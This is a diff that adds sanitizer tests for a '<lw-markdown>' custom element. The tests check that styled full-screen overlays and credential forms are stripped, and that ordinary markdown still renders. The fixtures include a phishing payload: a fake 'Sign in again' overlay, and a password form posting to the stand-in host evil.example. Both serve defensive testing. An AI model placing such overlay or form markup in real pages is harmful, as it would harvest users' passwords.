@@ -40,6 +40,51 @@ describe('<lw-markdown> custom element', () => {
     expect(raw).not.toContain('javascript:');
   });
 
+  it('renders an overlay drawn with a style attribute without its style', () => {
+    const html = render(
+      '<div style="position:fixed;inset:0;z-index:9999">Sign in again</div>',
+    );
+
+    expect(html).toContain('Sign in again');
+    expect(html).not.toContain('style');
+    expect(html).not.toContain('position:fixed');
+  });
+
+  it('renders a credential form without its form, fields or buttons', () => {
+    const html = render(
+      '<form action="https://evil.example/collect" method="post">' +
+        '<fieldset><label for="p">Password</label>' +
+        '<input id="p" type="password" name="p">' +
+        '<select name="s"><option>a</option></select>' +
+        '<textarea name="t"></textarea>' +
+        '<button formaction="https://evil.example/other">Send</button>' +
+        '</fieldset></form>',
+    );
+
+    const controls = ['form', 'input', 'button', 'select', 'textarea', 'option', 'label', 'fieldset'];
+    for (const tag of controls) {
+      expect(html).not.toContain(`<${tag}`);
+    }
+    for (const attribute of ['action=', 'formaction', 'method=']) {
+      expect(html).not.toContain(attribute);
+    }
+    expect(html).not.toContain('evil.example');
+  });
+
+  it('renders ordinary markdown unchanged by the stricter profile', () => {
+    const html = render(
+      '# Title\n\n- one\n- two\n\n[docs](https://example.com/docs)\n\n`code`\n\n' +
+        '```\nblock\n```\n\n![logo](https://example.com/logo.png)',
+    );
+
+    expect(html).toContain('<h1>Title</h1>');
+    expect(html).toContain('<li>one</li>');
+    expect(html).toContain('<a href="https://example.com/docs">docs</a>');
+    expect(html).toContain('<code>code</code>');
+    expect(html).toContain('<pre><code>block');
+    expect(html).toContain('<img src="https://example.com/logo.png" alt="logo">');
+  });
+
   it('re-renders when the source attribute changes', () => {
     const element = document.createElement(LW_MARKDOWN_TAG);
     element.setAttribute('source', '*one*');
